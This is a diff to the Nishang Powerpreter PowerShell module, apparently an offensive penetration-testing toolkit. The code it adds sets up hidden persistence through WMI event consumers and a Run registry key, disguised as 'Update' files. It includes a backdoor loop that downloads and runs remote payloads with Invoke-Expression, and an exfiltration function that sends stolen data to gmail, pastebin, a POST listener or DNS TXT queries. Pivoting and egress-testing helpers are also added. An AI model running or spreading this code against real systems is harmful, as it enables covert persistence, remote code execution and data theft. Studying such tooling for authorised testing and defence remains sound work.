+[CmdletBinding(DefaultParameterSetName="noexfil")] Param(
+
+        [Parameter(Parametersetname="exfil")]
+        [Switch]
+        $exfil,
+
+        [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")]
+        [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")]
+        [String]
+        $CheckURL,
+
+        [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")]
+        [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")]
+        [String]
+        $PayloadURL,
+
+        [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")]
+        [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")]
+        [String]
+        $PowerpreterURL,
+
+        [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")]
+        [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")]
+        [String]
+        $MagicString,
+
+        [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")]
+        [Parameter(Position = 4, Mandatory = $True, Parametersetname="noexfil")]
+        [String]
+        $StopString,
+        
+        [Parameter(Position = 5, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
+        [String]
+        $ExfilOption,
+
+        [Parameter(Position = 6, Mandatory = $False, Parametersetname="exfil")] 
+        [String]
+        $dev_key = "null",
+
+        [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")]
+        [String]
+        $username = "null",
+
+        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
+        [String]
+        $password = "null",
+
+        [Parameter(Position = 9, Mandatory = $False, Parametersetname="exfil")]
+        [String]
+        $URL = "null",
+      
+        [Parameter(Position = 10, Mandatory = $False, Parametersetname="exfil")]
+        [String]
+        $DomainName = "null",
+
+        [Parameter(Position = 11, Mandatory = $False, Parametersetname="exfil")]
+        [String]
+        $AuthNS = "null"   
+   
+   )
+
     $backdoorcode = @' 
-function Persistence_HTTP ($CheckURL, $PayloadURL, $MagicString, $StopString, $dev_key, $username, $password, $keyoutoption, $exfil) 
+function Persistence_HTTP ($CheckURL, $PayloadURL, $MagicString, $StopString, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $AuthNS, $exfil) 
 {
     while($true)
     {
@@ -3047,15 +3118,11 @@ function Persistence_HTTP ($CheckURL, $PayloadURL, $MagicString, $StopString, $d
     $filecontent = $webclient.DownloadString("$CheckURL")
     if($filecontent -eq $MagicString)
     {
-        $webclient = New-Object System.Net.WebClient
-        $file1 = "$env:temp\payload.ps1"
-        $webclient.DownloadFile($PayloadURL,"$file1")
-        $pastevalue = Invoke-Expression $file1
+        $pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL)
         $exec++
         if ($exfil -eq $True)
         {
-           $pastename = $env:COMPUTERNAME + " Results of Persistence: "
-           Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
+           Do-Exfiltration "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$AuthNS"
         }
         if ($exec -eq 1)
         {
@@ -3069,8 +3136,15 @@ function Persistence_HTTP ($CheckURL, $PayloadURL, $MagicString, $StopString, $d
     }
 }
 '@
-
-
+    $powerpreterpath =  $MyInvocation.MyCommand.Module.Path
+    Copy-Item $powerpreterpath -Destination $env:TEMP\Update.psm1
+    echo "Set objShell = CreateObject(`"Wscript.shell`")" > "$env:temp\update.vbs"
+    echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\update.ps1`")" >> "$env:temp\update.vbs"
+    echo "if (!(Test-Path $env:TEMP\Update.psm1)) {(New-Object Net.WebClient).DownloadFile(`"$PowerpreterURL`",`"$env:temp\Update.psm1`")}" >> "$env:temp\update.ps1"
+    echo "mkdir `"$home\Documents\WindowsPowerShell\Modules\Update(x64)`", `"$home\Documents\WindowsPowerShell\Modules\Update`", `"$home\Documents\WindowsPowerShell\Modules\UpdateCheck`"" > "$env:temp\update.ps1"
+    echo "`$currentpath = `"$env:temp\Update.psm1`"" >> "$env:temp\update.ps1"
+    echo "Copy-Item `$currentpath -Destination `"$home\Documents\WindowsPowerShell\Modules\Update`"" >> "$env:temp\update.ps1"
+    Out-File -InputObject $backdoorcode -Append "$env:TEMP\update.ps1"
     $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
     if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
     {
@@ -3082,43 +3156,29 @@ function Persistence_HTTP ($CheckURL, $PayloadURL, $MagicString, $StopString, $d
 "@
         $filterName = "WindowsSanity"
         $scriptpath = $env:TEMP
-        $scriptFileName = "$scriptpath\$name"
+        $scriptFileName = "$scriptpath\update.vbs"
         $filterPath = Set-WmiInstance -Class __EventFilter -Namespace $wmiNS -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
         $consumerPath = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wmiNS -Arguments @{name="WindowsSanity"; ScriptFileName=$scriptFileName; ScriptingEngine="VBScript"}
         Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
-        echo "Set objShell = CreateObject(`"Wscript.shell`")" > "$env:temp\persist.vbs"
-        echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\persist.ps1`")" >> "$env:temp\persist.vbs"
-        $powerpreterpath =  $MyInvocation.MyCommand.Module.Path
-        Copy-Item $powerpreterpath -Destination $env:TEMP\Update.psm1
         $options = "Persistence_HTTP  $CheckURL $PayloadURL $MagicString $StopString"
         if ($exfil -eq $True)
         {
-            $options = "Persistence_HTTP $CheckURL $PayloadURL $MagicString $StopString $dev_key $username $password $keyoutoption $exfil"
+            $options = "Persistence_HTTP $CheckURL $PayloadURL $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil"
         }
-        echo "mkdir `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update(x64)`", `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update`", `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\UpdateCheck`"" > "$env:temp\persist.ps1"
-        echo "`$currentpath = `"$env:temp\Update.psm1`"" >> "$env:temp\persist.ps1"
-        echo "Copy-Item `$currentpath -Destination `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update`"" >> "$env:temp\persist.ps1"
-        Out-File -InputObject $backdoorcode -Append "$env:TEMP\persist.ps1"
-        Out-File -InputObject $options -Append "$env:TEMP\persist.ps1"
+        Out-File -InputObject $options -Append "$env:TEMP\update.ps1"
     }
     else
     {
-        New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value "$($env:temp)\persist.vbs" -force
-        $powerpreterpath =  $MyInvocation.MyCommand.Module.Path
-        Copy-Item -path $powerpreterpath -Destination $env:TEMP\Update.psm1
+        New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value "$($env:temp)\update.vbs" -force
         $options = "Persistence_HTTP  $CheckURL $PayloadURL $MagicString $StopString"
         if ($exfil -eq $True)
         {
-            $options = "Persistence_HTTP $CheckURL $PayloadURL $MagicString $StopString $dev_key $username $password $keyoutoption $exfil"
+            $options = "Persistence_HTTP $CheckURL $PayloadURL $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil"
         }
-        echo "mkdir `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update(x64)`", `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update`", `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\UpdateCheck`"" > "$env:temp\persist.ps1"
-        echo "`$currentpath = `"$env:temp\Update.psm1`"" >> "$env:temp\persist.ps1"
-        echo "Copy-Item `$currentpath -Destination `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update`"" >> "$env:temp\persist.ps1"
-        Out-File -InputObject $backdoorcode -Append "$env:TEMP\persist.ps1"
-        Out-File -InputObject $options -Append "$env:TEMP\persist.ps1"
-        echo "Set objShell = CreateObject(`"Wscript.shell`")" > "$env:temp\persist.vbs"
-        echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\persist.ps1`")" >> "$env:temp\persist.vbs"
-    } 
+        Out-File -InputObject $options -Append "$env:TEMP\update.ps1"
+    }
+    
+    Invoke-Expression "$env:TEMP\update.vbs"
 }
 
 
@@ -3137,13 +3197,16 @@ Run the function as an Administrator to remove the WMI events.
 PS > Remove-Persistence
 
 .LINK
-http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+http://labofapenetrationtester.com/
+https://github.com/samratashok/nishang
 http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript.aspx
 #>
-    Param( [Parameter(Position = 0)] [Switch] $remove)
+   [CmdletBinding(DefaultParameterSetName="noexfil")] Param(
+        [Parameter(Position = 0)] [Switch]
+        $Remove
+    )
 
-    if ($remove -eq $true)
+    if ($Remove -eq $true)
     {
         $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
         if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true)
@@ -3227,16 +3290,30 @@ Above command asks the user to provide username and passowrd and creates PSSessi
 Get-Process is executed on the target. Use Use-Session to interact with the created sessions.
 
 .LINK
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 #>
 
 
 
-    Param ( [Parameter(Position = 0, Mandatory = $True)] [String[]] $Computer,
-        [Parameter(Position = 1)] [String] $User,
-        [Parameter(Position = 2)] [String] $Pass,
-        [Parameter(Position = 3)] [String] $cmd,
-        [Switch] $Non_Interactive)
+    [CmdletBinding()] Param ( 
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String[]]
+        $Computer,
+
+        [Parameter(Position = 1)]
+        [String]
+        $User,
+
+        [Parameter(Position = 2)]
+        [String]
+        $Pass,
+
+        [Parameter(Position = 3)]
+        [String]
+        $cmd,
+
+        [Switch] $Non_Interactive
+    )
 
     #Interactive pivoting
     if ($Non_Interactive -eq $false)
@@ -3304,9 +3381,12 @@ Above command uses the credentials available with current powershell session (or
 It creates PSSsessions. Use Use-Session to interact with the created sessions.
 
 .LINK
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 #>
-Param ( [Parameter(Position = 0, Mandatory = $True)] $id)
+    [CmdletBinding()] Param (
+        [Parameter(Position = 0, Mandatory = $True)]
+        $id
+    )
 
     while($cmd -ne "exit")
     {
@@ -3322,68 +3402,483 @@ Param ( [Parameter(Position = 0, Mandatory = $True)] $id)
 
 #####################################################Exfiltration Functionality################################################
 
-    function Do-Exfiltration($pastename,$pastevalue,$username,$password,$dev_key,$keyoutoption,$filename)
-    {
-        Write-Host "`n`n`n`n`n"
-        function post_http($url,$parameters) 
-        { 
-            $http_request = New-Object -ComObject Msxml2.XMLHTTP 
-            $http_request.open("POST", $url, $false) 
-            $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
-            $http_request.setRequestHeader("Content-length", $parameters.length); 
-            $http_request.setRequestHeader("Connection", "close") 
-            $http_request.send($parameters) 
-            $script:session_key=$http_request.responseText 
-        } 
+function Do-Exfiltration
+{
+<#
+.SYNOPSIS
+Use this function to exfiltrate data from a target.
 
-        function Get-MD5()
-        {
-            #http://stackoverflow.com/questions/10521061/how-to-get-a-md5-checksum-in-powershell
-            $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
-            $utf8 = new-object -TypeName System.Text.UTF8Encoding
-            $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($password))).Replace("-", "").ToLower()
-            return $hash
-        }
+.DESCRIPTION
+This function could be used to exfiltrate data from a target to gmail, pastebin, a webserver which could log POST requests
+and a DNS Server which could log TXT queries. To decode the data exfiltrated by webserver and DNS methods use Invoke-Decode.
 
-        if ($keyoutoption -eq "0")
-        {
-            $pastevalue
-        }
+.PARAMETER Data
+The data to be exfiltrated. Could be supplied by pipeline. 
 
-        elseif ($keyoutoption -eq "1")
-        {
-            $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($pastevalue)
-            $pastevalue = [System.Convert]::ToBase64String($utfbytes)
-            post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
-            post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
-        }
+.PARAMETER ExfilOption
+The method you want to use for exfitration of data. Valid options are "gmail","pastebin","WebServer" and "DNS".
+
+.PARAMETER dev_key
+The Unique API key provided by pastebin when you register a free account.
+Unused for other options
+
+.PARAMETER username
+Username for the pastebin/gmail account where data would be exfiltrated.
+Unused for other options
+
+.PARAMETER password
+Password for the pastebin/gmail account where data would be exfiltrated.
+Unused for other options
+
+.PARAMETER URL
+The URL of the webserver where POST requests would be sent.
+
+.PARAMETER DomainName
+The DomainName, whose subdomains would be used for sending TXT queries to.
+
+.PARAMETER AuthNS
+Authoritative Name Server for the domain specified in DomainName
+
+
+.EXAMPLE
+PS > Get-Information | Do-Exfiltration -ExfilOption gmail -username <> -Password <>
+
+Use above command for data exfiltration to gmail
+
+.EXAMPLE
+PS > Get-Information | Do-Exfiltration -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
+
+Use above command for data exfiltration to a webserver which logs POST requests.
+
+
+.EXAMPLE
+PS > Get-Information | Do-Exfiltration -ExfilOption DNS -DomainName example.com -AuthNS 192.168.254.228
+
+Use above command for data exfiltration to a DNS server which logs TXT queries.
+
+
+.LINK
+http://labofapenetrationtester.com/
+https://github.com/samratashok/nishang
+#>
+
+    [CmdletBinding()] Param(
         
-        elseif ($keyoutoption -eq "2")
-        {
-            #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
-            $smtpserver = “smtp.gmail.com”
-            $msg = new-object Net.Mail.MailMessage
-            $smtp = new-object Net.Mail.SmtpClient($smtpServer )
-            $smtp.EnableSsl = $True
-            $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
-            $msg.From = “$username@gmail.com”
-            $msg.To.Add(”$username@gmail.com”)
-            $msg.Subject = $pastename
-            $msg.Body = $pastevalue
-            if ($filename)
-            {
-                $att = new-object Net.Mail.Attachment($filename)
-                $msg.Attachments.Add($att)
-            }
-            $smtp.Send($msg)
-        }
+        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeLine = $True)] 
+        [String]
+        $Data,
+        
+        [Parameter(Position = 1, Mandatory = $True)] [ValidateSet("gmail","pastebin","WebServer","DNS")]
+        [String]
+        $ExfilOption,
 
-        elseif ($keyoutoption -eq "3")
+        [Parameter(Position = 2, Mandatory = $False)] 
+        [String]
+        $dev_key,
+
+        [Parameter(Position = 3, Mandatory = $False)]
+        [String]
+        $username,
+
+        [Parameter(Position = 4, Mandatory = $False)]
+        [String]
+        $password,
+
+        [Parameter(Position = 5, Mandatory = $False)]
+        [String]
+        $URL,
+      
+        [Parameter(Position = 6, Mandatory = $False)]
+        [String]
+        $DomainName,
+
+        [Parameter(Position = 7, Mandatory = $False)]
+        [String]
+        $AuthNS
+    )
+
+    function post_http($url,$parameters) 
+    { 
+        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
+        $http_request.open("POST", $url, $false) 
+        $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
+        $http_request.setRequestHeader("Content-length", $parameters.length); 
+        $http_request.setRequestHeader("Connection", "close") 
+        $http_request.send($parameters) 
+        $script:session_key=$http_request.responseText 
+    } 
+
+    function Compress-Encode
+    {
+        #Compression logic from http://blog.karstein-consulting.com/2010/10/19/how-to-embedd-compressed-scripts-in-other-powershell-scripts/
+        $encdata = [string]::Join("`n", $Data)
+        $ms = New-Object System.IO.MemoryStream
+        $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
+        $sw = New-Object System.IO.StreamWriter($cs)
+        $sw.Write($encdata)
+        $sw.Close();
+        $Compressed = [Convert]::ToBase64String($ms.ToArray())
+        $Compressed
+    }
+
+    if ($exfiloption -eq "pastebin")
+    {
+        $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
+        $pastevalue = [System.Convert]::ToBase64String($utfbytes)
+        $pastename = "Exfiltrated Data"
+        post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
+        post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
+    }
+        
+    elseif ($exfiloption -eq "gmail")
+    {
+        #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
+        $smtpserver = “smtp.gmail.com”
+        $msg = new-object Net.Mail.MailMessage
+        $smtp = new-object Net.Mail.SmtpClient($smtpServer )
+        $smtp.EnableSsl = $True
+        $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
+        $msg.From = “$username@gmail.com”
+        $msg.To.Add(”$username@gmail.com”)
+        $msg.Subject = "Exfiltrated Data"
+        $msg.Body = $Data
+        if ($filename)
         {
-            
-            $hash = Get-MD5
-            post_http "http://tny.cz/api/create.xml" "paste=$pastevalue&title=$pastename&is_code=0&is_private=1&password=$dev_key&authenticate=$username`:$hash"
+            $att = new-object Net.Mail.Attachment($filename)
+            $msg.Attachments.Add($att)
         }
+        $smtp.Send($msg)
+    }
+
+    elseif ($exfiloption -eq "webserver")
+    {
+        $Data = Compress-Encode    
+        post_http $URL $Data
+    }
+    elseif ($ExfilOption -eq "DNS")
+    {
+        $code = Compress-Encode
+        $queries = [int]($code.Length/63)
+        while ($queries -ne 0)
+        {
+            $querystring = $code.Substring($lengthofsubstr,63)
+            Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $AuthNS"
+            $lengthofsubstr += 63
+            $queries -= 1
+        }
+        $mod = $code.Length%63
+        $query = $code.Substring($code.Length - $mod, $mod)
+        Invoke-Expression "nslookup -querytype=txt $query.$DomainName $AuthNS"
 
     }
 
+}
+
+################################################Compress and Encode scripts and strings###############################
+
+function Invoke-Encode
+{
+<#
+.SYNOPSIS
+Functiob to encode and compress plain data.
+
+.DESCRIPTION
+The function asks for a path to a plain file, encodes it and writes to a file "encoded.txt" in the current working directory.
+Both the encoding and decoding is based on the code by ikarstein.
+
+.PARAMETER DataToEncode
+The path of the file to be decoded. Use with -IsString to enter a string.
+
+
+.PARAMETER OutputFilePath
+The path of the output file. Default is "encoded.txt" in the current working directory.
+
+.PARAMETER IsString
+Use this to specify if you are passing a string ins place of a filepath.
+
+.EXAMPLE
+
+PS > Invoke-Encode -DataToEncode C:\files\encoded.txt
+
+.EXAMPLE
+
+PS > Invoke-Encode Get-Process -IsString
+
+Use above to decode a string.
+
+.LINK
+http://blog.karstein-consulting.com/2010/10/19/how-to-embedd-compressed-scripts-in-other-powershell-scripts/
+https://github.com/samratashok/nishang    
+#>    
+    
+    
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $DataToEncode,
+
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]
+        $OutputFilePath = ".\encoded.txt", 
+
+        [Switch]
+        $IsString
+    )
+    if($IsString -eq $true)
+    {
+    
+       $Enc = $DataToEncode
+       
+    }
+    else
+    {
+        $Enc = Get-Content $DataToEncode -Encoding UTF8 
+    }
+
+    $data = [string]::Join("`n", $Enc)
+    $ms = New-Object System.IO.MemoryStream
+    $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
+    $sw = New-Object System.IO.StreamWriter($cs)
+    $sw.Write($data)
+    $sw.Close();
+    $Compressed = [Convert]::ToBase64String($ms.ToArray())
+    $Compressed
+    Out-File -InputObject $Compressed -FilePath .\encoded.txt
+    Write-Host "Decode data written to $OutputFilePath"
+}
+
+################################################Decode scripts and strings encoded by Invoke-Encode###############################
+function Invoke-Decode
+{
+<#
+.SYNOPSIS
+Function to decode the data encoded by Invoke-Encode, DNS TXT and POST exfiltration methods.
+
+.DESCRIPTION
+The function asks for an encoded string as an option, decodes it and writes to a file "decoded.txt" in the current working directory.
+Both the encoding and decoding is based on the code by ikarstein.
+
+.PARAMETER EncodedData
+The path of the file to be decoded. Use with -IsString to enter a string.
+
+
+.PARAMETER OutputFilePath
+The path of the output file. Default is "decoded.txt" in the current working directory.
+
+.PARAMETER IsString
+Use this to specify if you are passing a string ins place of a filepath.
+
+.EXAMPLE
+
+PS > Invoke-Decode -EncodedData C:\files\encoded.txt
+
+.EXAMPLE
+
+PS > Invoke-Decode K07MLUosSSzOyM+OycvMzsjM4eUCAA== -IsString
+
+Use above to decode a string.
+
+.LINK
+http://blog.karstein-consulting.com/2010/10/19/how-to-embedd-compressed-scripts-in-other-powershell-scripts/
+https://github.com/samratashok/nishang
+
+#>
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $EncodedData,
+
+       
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]
+        $OutputFilePath = ".\decoded.txt", 
+
+        [Switch]
+        $IsString
+    )
+    
+    if($IsString -eq $true)
+    {
+    
+       $data = $EncodedData
+       
+    }
+    else
+    {
+        $data = Get-Content $EncodedData -Encoding UTF8 
+    }
+    $dec = [System.Convert]::FromBase64String($data)
+    $ms = New-Object System.IO.MemoryStream
+    $ms.Write($dec, 0, $dec.Length)
+    $ms.Seek(0,0) | Out-Null
+    $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
+    $sr = New-Object System.IO.StreamReader($cs)
+    $output = $sr.readtoend()
+    $output
+    Out-File -InputObject $output -FilePath $OutputFilePath
+    Write-Host "Decode data written to $OutputFilePath"
+}
+
+############################################### Listener for Egress testing #############################################################
+<#
+.SYNOPSIS
+FireListener is a functions that does egress testing. It is to be run on the attacking/listening machine.
+
+.DESCRIPTION
+FireListener hosts a listening server to which FireBuster can send packets to. Firebuster is to be run on the target machine which is to 
+be tested for egress filtering.
+
+.EXAMPLE
+PS > FireListener -portrange 1000-1020
+
+.LINK
+http://www.labofapenetrationtester.com/2014/04/egress-testing-using-powershell.html
+https://github.com/samratashok/nishang
+http://roo7break.co.uk
+
+.NOTES
+Based on the script written by Nikhil ShreeKumar (@roo7break)
+#>
+
+
+function FireListener
+{
+    Param( 
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $PortRange
+    )
+    
+    $ErrorActionPreference = 'SilentlyContinue'
+    #Code which opens a socket for each port
+    $socketblock = { 
+		param($port = $args[1])
+		try
+		{
+		
+			$EndPoint = New-Object System.Net.IPEndPoint([ipaddress]::any, $port)
+			$ListenSocket = New-Object System.Net.Sockets.TCPListener $EndPoint
+			$ListenSocket.Start()		
+			$RecData = $ListenSocket.AcceptTCPClient()
+			$clientip = $RecData.Client.RemoteEndPoint.Address.ToString()
+            $clientport = $RecData.Client.LocalEndPoint.Port.ToString()
+			Write-Host "$clientip connected through port $clientport" -ForegroundColor Green
+		    $Stream.Close()
+			$ListenSocket.Stop()		
+			} catch
+			{ Write-Error $Error[0]	}
+    }
+		
+	[int] $lowport = $portrange.split("-")[0]
+	[int] $highport = $portrange.split("-")[1]	
+	[int] $ports = 0	   
+	Get-Job | Remove-Job
+
+    #Start a job for each port
+	for($ports=$lowport; $ports -le $highport; $ports++)
+	{
+		"Listening on port $ports"	
+        $job = start-job -ScriptBlock $socketblock -ArgumentList $ports -Name $ports
+	}
+
+
+	[console]::TreatControlCAsInput = $true
+	while ($true)
+	{
+		# code from http://poshcode.org/542 to capture Ctrl+C
+		# start code snip
+		if ($Host.UI.RawUI.KeyAvailable -and (3 -eq [int]$Host.UI.RawUI.ReadKey("AllowCtrlC,IncludeKeyUp,NoEcho").Character))
+		{
+			Write-Host "Stopping all jobs.....This can take many minutes." -Background DarkRed
+			Sleep 2
+            Get-Job | Stop-Job 
+            Get-Job | Remove-Job
+			#Stop-Process -Id $PID
+			break;
+		}
+		# end code snip
+		
+
+        #Start a new job which listens on the same port for every completed job.
+		foreach ($job1 in (Get-Job))
+		{ 
+            Start-Sleep -Seconds 4
+			Get-Job | Receive-Job
+			if ($job1.State -eq "Completed")
+			{
+				$port = $job1.Name
+                "Listening on port $port"
+                $newjobs = start-job -ScriptBlock $socketblock -ArgumentList $port -Name $port
+                Get-Job | Remove-Job
+			}
+		}
+	}
+}
+
+################################################## Connector for Egress Testing ##########################################################
+
+function FireBuster{
+
+<#
+.SYNOPSIS
+This script is part of Nishang. FireBuster is a PowerShell script that does egress testing. It is to be run on the target machine.
+
+.DESCRIPTION
+FireBuster sends packets to FireListener, which hosts a listening server. By default, FireBuster sends packets to all ports (which could be VERY slow).
+
+.EXAMPLE
+PS> FireBuster 10.10.10.10 1000-1020
+
+.EXAMPLE
+PS> FireBuster 10.10.10.10 1000-1020 -Verbose
+Use above for increased verbosity.
+
+.LINK
+http://www.labofapenetrationtester.com/2014/04/egress-testing-using-powershell.html
+https://github.com/samratashok/nishang
+http://roo7break.co.uk
+
+.NOTES
+Major part of the script is written by Nikhil ShreeKumar (@roo7break)
+#>
+    
+    [CmdletBinding()] Param( 
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $targetip = $(throw "Please specify an EndPoint (Host or IP Address)"),
+
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String] $portrange = "1-65535"
+    )
+    
+    $ErrorActionPreference = 'SilentlyContinue'    
+    [int] $lowport = $portrange.split("-")[0]
+    [int] $highport = $portrange.split("-")[1]
+	
+    $hostaddr = [system.net.IPAddress]::Parse($targetip)
+    Write-Verbose "Trying to connect to $hostaddr from $lowport to $highport"
+	[int] $ports = 0
+	Write-Host "Sending...."
+	for($ports=$lowport; $ports -le $highport ; $ports++){
+        try{
+            Write-Verbose "Trying port $ports"
+            $client = New-Object System.Net.Sockets.TcpClient
+            $beginConnect = $client.BeginConnect($hostaddr,$ports,$null,$null)
+            $TimeOut = 300
+            if($client.Connected)
+            {
+                Write-Host "Connected to port $ports" -ForegroundColor Green
+            }
+            else 
+            {
+                Start-Sleep -Milli $TimeOut
+                if($client.Connected) 
+                {
+                    Write-Host "Connected to port $ports" -ForegroundColor Green
+                }
+            }
+            $client.Close()
+        }catch { Write-Error $Error[0]}
+    }        
+	Write-Host "Data sent to all ports"
+}
